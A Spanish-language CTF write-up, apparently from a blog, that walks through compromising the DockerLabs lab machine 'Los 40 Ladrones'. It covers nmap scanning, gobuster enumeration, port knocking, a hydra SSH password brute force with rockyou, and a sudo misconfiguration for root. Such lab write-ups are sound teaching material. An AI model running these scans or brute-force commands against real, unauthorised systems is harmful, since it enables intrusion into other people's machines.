---
title: Los 40 Ladrones - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | firstatack        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/ae7e41b1-e887-406d-8751-4a808acf471e)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `80` (HTTP)
  
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p 80 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/0a3e3574-8913-430b-baca-e97c83524414)

# Exploración Web

Al acceder a la página web, encontramos el panel de Apache por defecto:

![image](https://github.com/user-attachments/assets/9c942317-b41e-4868-97b8-b63a17529026)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/f076364f-a5d0-48bf-bc24-ed629919f09d)

Al revisar el archivo `qdefense.txt`, encontramos un acertijo:

![image](https://github.com/user-attachments/assets/deadb7f9-a6aa-4ede-add4-cca86452232c)

## Port Knocking

Obtenemos que hay un user llamado `toctoc` y una secuencia de números que puede ser una secuencia de `Port Knocking`.  *El Port Knocking* es una técnica de seguridad en la que se debe enviar una secuencia específica de conexiones a ciertos puertos para desbloquear un puerto cerrado..

Para instalar `knock` en Kali:
```bash
sudo apt update && sudo apt install -y knockd

```
Realizamos `Port Knocking` a los puertos en la secuencia que hemos obtenido:

```bash
knock -v 172.17.0.2 7000 8000 9000
```
![image](https://github.com/user-attachments/assets/6c2ba48c-8a51-4e4f-9a0d-b44a2a27fdde)

Volvemos a escanear los puertos con `nmap`:

![image](https://github.com/user-attachments/assets/a4fec89a-29a7-4ebb-b4b3-630bc79ff826)

## Fuerza burta 
Después de realizar el `Port Knocking`, el puerto `22` (SSH) está abierto. Vamos a probar fuerza bruta con el usuario toctoc utilizando `hydra`:
```bash
hydra -l 'toctoc' -P /usr/share/wordlists/rockyou.txt  ssh://172.17.0.2 -t 4
```

![image](https://github.com/user-attachments/assets/68beeb4e-fea1-4817-b554-0004af0ac149)

Ya tenemos la contraseña del usuario `toctoc`.

# Escalada de privilegios
Al ejecutar `sudo -l`, vemos que podemos ejecutar `bash` como `root`. Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/d5ab1828-bacc-4b97-8afc-c18921aef600)

Ejecutamos el siguiente comando para acceder como `root`:

```bash
sudo /opt/bash 
```
![image](https://github.com/user-attachments/assets/1d781ad1-6481-4a0b-bcbf-b9f7262297b1)

¡Ya somos root!
